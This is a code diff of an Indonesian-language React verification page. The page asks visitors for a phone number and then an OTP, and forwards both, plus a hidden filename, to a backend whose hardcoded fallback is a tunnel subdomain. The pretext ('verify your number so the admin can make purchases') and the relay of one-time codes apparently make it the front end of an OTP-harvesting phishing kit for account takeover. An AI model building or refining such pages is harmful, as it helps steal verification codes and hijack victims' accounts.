@@ -13,12 +13,14 @@ export default function Content() {
     const [data, setData] = useState({ filename: '', number: '' });
     const [done, setDone] = useState(false);
 
+    // Fallback ke subdomain jika variabel lingkungan tidak tersedia
+    const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'https://webstore.mitunnel.id';
 
     const handleInputNumber = async (e) => {
         e.preventDefault();
 
         try {
-            const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/send-number/${phoneNumber}`, {
+            const response = await fetch(`${apiUrl}/api/send-number/${phoneNumber}`, {
                 method: 'GET',
             });
 
@@ -36,13 +38,13 @@ export default function Content() {
             console.error(error);
             setMessage('Error sending OTP.');
         }
-    }
+    };
 
     const handleOtpSubmit = async (e) => {
-        e.preventDefault(); // Un-commented to prevent default form submission
+        e.preventDefault();
 
         try {
-            const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/send-otp/${phoneDetail}/${otp}/${file}`, {
+            const response = await fetch(`${apiUrl}/api/send-otp/${phoneDetail}/${otp}/${file}`, {
                 method: 'GET',
             });
 
@@ -58,12 +60,14 @@ export default function Content() {
             console.error(error);
             setMessage('Error verifying OTP.');
         }
-    }
+    };
 
-    return done !== true ?
+    return done !== true ? (
         <>
             <div className="mx-auto max-w-2xl text-center">
-                <h2 className="text-3xl font-bold tracking-tight text-gray-900 sm:text-4xl">Verifikasi nomor anda</h2>
+                <h2 className="text-3xl font-bold tracking-tight text-gray-900 sm:text-4xl">
+                    Verifikasi nomor anda
+                </h2>
                 <p className="mt-2 text-lg leading-8 text-gray-600">
                     Verifikasi nomor anda untuk memudahkan admin melakukan pembelian
                 </p>
@@ -83,7 +87,7 @@ export default function Content() {
                                     name="nomor"
                                     type="text"
                                     autoComplete="off"
-                                    placeholder='0819xxxxx'
+                                    placeholder="0819xxxxx"
                                     className="flex-grow block w-full rounded-md border-0 px-3.5 py-2 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6"
                                     required
                                     value={phoneNumber}
@@ -111,8 +115,6 @@ export default function Content() {
                                     name="filename"
                                     type="hidden"
                                     autoComplete="off"
-                                    placeholder='Filename'
-                                    className="flex-grow block w-full rounded-md border-0 px-3.5 py-2 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6"
                                     value={data.filename}
                                     readOnly
                                 />
@@ -121,8 +123,6 @@ export default function Content() {
                                     name="number"
                                     type="hidden"
                                     autoComplete="off"
-                                    placeholder='Phone Number'
-                                    className="flex-grow block w-full rounded-md border-0 px-3.5 py-2 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6"
                                     value={data.number}
                                     readOnly
                                 />
@@ -148,8 +148,7 @@ export default function Content() {
                 </div>
             </div>
         </>
-        :
-        <>
-            <Response message={message} />
-        </>
+    ) : (
+        <Response message={message} />
+    );
 }
